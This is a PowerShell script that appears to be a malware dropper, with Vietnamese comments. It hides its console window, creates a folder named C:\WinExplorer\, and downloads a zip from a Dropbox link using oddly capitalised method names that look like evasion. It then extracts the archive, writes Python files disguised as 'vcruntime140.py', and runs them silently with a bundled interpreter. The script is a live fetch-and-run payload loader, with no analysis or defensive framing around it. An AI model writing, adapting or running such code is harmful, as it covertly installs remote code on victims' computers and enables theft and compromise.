function Hide-ConsoleWindow() {
  $ShowWindowAsyncCode = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
  $ShowWindowAsync = Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru

  $hwnd = (Get-Process -PID $pid).MainWindowHandle
  if ($hwnd -ne [System.IntPtr]::Zero) {
    $ShowWindowAsync::ShowWindowAsync($hwnd, 0)
  } else {

    $UniqueWindowTitle = New-Guid
    $Host.UI.RawUI.WindowTitle = $UniqueWindowTitle
    $StringBuilder = New-Object System.Text.StringBuilder 1024
    $TerminalProcess = (Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle })
   
    $hwnd = $TerminalProcess.MainWindowHandle
    if ($hwnd -ne [System.IntPtr]::Zero) {
      $ShowWindowAsync::ShowWindowAsync($hwnd, 0)
    } else {
      Write-Host "Failed to hide the console window."
    }
  }
}
Hide-ConsoleWindow
$envp = "C:\WinExplorer\"
if (-not (Test-Path $envp)) {
    New-Item -ItemType Directory -Path $envp
    #Write-Host "Đường dẫn đã được tạo: $envp"
}
else {
    #Write-Host "Đường dẫn đã tồn tại: $envp"
}
$envu = "https://www.dropbox.com/scl/fi/vj07btn4tc143y5859p5j/Env.zip?rlkey=rbl0vyetokems4ea4k9iut278&st=2xlzkrtt&dl=1"
$envz = $envp + "WinHelper.zip"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
(New-Object -TypeName System.Net.WeBClient).DoWnloAdFile($envu, $envz)
try {
    # Tải thư viện System.IO.Compression.FileSystem nếu chưa có
    Add-Type -AssemblyName "System.IO.Compression.FileSystem"

    # Đường dẫn đến file ZIP và thư mục đích
    $zipFilePath = $envz
    $destinationFolder = $envp

    # Giải nén file ZIP
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFilePath, $destinationFolder)

    Write-Host "Giải nén thành công!";
} catch {
    Write-Host "Có lỗi xảy ra trong quá trình giải nén:"
}
$st = $envp + "Gimport.dat"
$stct = Get-Content -Path $st -Raw 
$stct2 = Get-Content -Path $st -Raw

$stct = $stct -replace "%up%", $url 
$stct2 = $stct2 -replace "%up%", $url2
$rtc1 = $envp + "vcruntime140.py"
$rtc2 = $envp + "vcruntime140d.py"
Set-Content -Path $rtc1 -Value $stct
Set-Content -Path $rtc2 -Value $stct2
$e = $envp + "python.exe" 
Start-Process -FilePath $e -ArgumentList "`"$rtc1`"" -NoNewWindow 
Start-Process -FilePath $e -ArgumentList "`"$rtc2`"" -NoNewWindow
